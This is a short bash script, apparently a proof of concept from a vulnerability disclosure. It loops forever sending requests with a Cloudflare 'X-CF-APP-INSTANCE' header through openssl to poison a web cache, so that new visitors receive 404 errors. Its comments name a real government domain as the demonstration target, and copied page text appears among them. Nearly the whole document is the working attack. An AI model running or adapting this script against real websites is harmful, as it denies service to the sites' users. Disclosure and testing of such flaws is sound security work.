#!/bin/bash

while true
do
    printf 'GET /?cb=xxx HTTP/1.1\r\n'\
'Host: <url_vulnerable_to_poisoning>\r\n'\
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0\r\n'\
'Accept: */*\r\n'\
'Accept-Language: en-US,en;q=0.5\r\n'\
'Accept-Encoding: gzip, deflate\r\n'\
# ================================================================================
# Check for Cloudflare headers
# Any number of different headers can be used here
# ================================================================================
'X-CF-APP-INSTANCE: xxx:1\r\n'\
# ================================================================================
'Connection: close\r\n'\
'\r\n'\
    | openssl s_client -ign_eof -connect <url_vulnerable_to_poisoning>:443
    sleep 1
done

# You should see 404 errors being returned in this script's output. Because the web cache appears to key on Cookie header values, this will only poison the cache for users without a pre-existing cookie for the domain (i.e. new users). This can be demonstrated by the following curl command (or by accessing the resource in a private browser window session without pre-existing cookies):
# Code 167 BytesUnwrap lines Copy Download
# curl -i -s -k -X $'GET' \
#     -H $'Host: federation.data.gov' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' \
#     $'https://federation.data.gov/?cb=xxx